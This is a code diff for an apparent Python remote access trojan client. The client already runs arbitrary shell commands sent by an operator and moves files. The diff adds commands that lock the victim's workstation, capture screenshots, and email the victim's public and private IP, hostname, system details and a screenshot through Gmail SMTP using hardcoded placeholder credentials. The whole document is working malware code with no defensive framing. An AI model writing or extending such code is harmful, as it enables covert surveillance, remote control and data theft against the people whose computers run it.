@@ -2,12 +2,17 @@ import subprocess
 import os
 import shutil
 import sys
+import requests
 import time
 import socket
 import json
 import pyscreeze
 import platform
 import ctypes
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.application import MIMEApplication
+import smtplib
 from io import StringIO, BytesIO
 from cryptography.fernet import Fernet
 
@@ -85,6 +90,62 @@ def upload(data):
             response = (objFile.read())  # Send Contents of File
     return response
 
+def lock():
+    ctypes.windll.user32.LockWorkStation()
+    response = b"[+] Locked!"
+    return response
+
+def screenshot():
+    img = pyscreeze.screenshot()
+    with BytesIO() as objBytes:
+        # Save Screenshot into BytesIO Object
+        img.save(objBytes, format="PNG")
+        # Get BytesIO Object Data as bytes
+        ss = objBytes.getvalue()
+
+    return ss
+
+def send_info_as_mail(email):
+    if email == "":
+        return b"[-] Invalid email address!"
+    try:
+        host = "smtp.gmail.com"
+        port = 465
+        val = smtplib.SMTP_SSL(host, port)
+        val.login("your@gmail.com", "Passw0rd!")
+
+        msg = MIMEMultipart()
+        msg['Subject'] = "Client Info"
+        msg['From'] = "your@gmail.com"
+        msg['To'] = email
+
+        response = requests.get("https://api.ipify.org?format=json")
+        public_ip = response.json()["ip"]
+        processor = platform.processor()
+        system_info = platform.system() + " " + platform.version()
+        host_name = socket.gethostname()
+        private_ip = socket.gethostbyname(host_name)
+        txt = MIMEText("""
+                                PUBLIC IP: {0}
+                                PROCESSOR: {1}
+                                SYSTEM:    {2}
+                                HOST NAME: {3}
+                                PRIVATE IP:{4}
+                               """.format(public_ip, processor, system_info, host_name, private_ip))
+        msg.attach(txt)
+
+
+        _file = MIMEApplication(screenshot(),  _subtype="png")
+        _file.add_header('Content-Disposition', 'attachment', filename="info.png")
+        msg.attach(_file)
+
+        val.send_message(msg)
+        val.quit()
+        return b"[+] Success!"
+
+    except Exception as e:
+        return f"[-] Error! {e}".encode()
+
 def run():
     while True:
         strCurrentDir = os.getcwd()
@@ -111,6 +172,13 @@ def run():
         elif order[:4] == "recv":
             bytResponse = upload(order[4:])
 
+        elif order[:4] == "lock":
+            bytResponse = lock()
+
+        elif order == "screenshot":
+            bytResponse = screenshot()
+        elif order[:4] == "mail":
+            bytResponse = send_info_as_mail(order[5:])
 
         elif len(order) > 0:
             objCommand = subprocess.Popen(order, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE, shell=True)
